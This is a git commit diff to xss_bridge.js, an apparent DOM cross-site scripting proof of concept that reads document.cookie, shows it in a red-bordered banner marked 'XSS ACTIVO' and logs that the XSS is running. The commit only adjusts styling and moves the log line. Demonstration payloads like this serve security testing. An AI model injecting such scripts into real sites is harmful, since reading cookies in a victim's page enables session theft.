e60f846abe3de74146a96e240598c41b3c205583
Juan Oviedo <65684836+juanoviedo28@users.noreply.github.com>
2025-06-30 17:50:36 -0300

    Update xss_bridge.js

--- xss_bridge.js
+++ xss_bridge.js
@@ -1,18 +1,14 @@
-// Mostrar un cartel visual con la cookie
+console.log("✅ DOM XSS en ejecución desde xss_bridge.js");
+
 let div = document.createElement("div");
 div.innerText = "XSS ACTIVO: " + document.cookie;
 div.style.position = "fixed";
 div.style.top = "10px";
 div.style.left = "10px";
 div.style.background = "white";
-div.style.padding = "10px";
+div.style.padding = "5px";
 div.style.border = "2px solid red";
 div.style.zIndex = 9999;
-div.style.fontSize = "14px";
 document.body.appendChild(div);
-
-// Confirmación en consola
-console.log("✅ DOM XSS en ejecución");
-
 
 
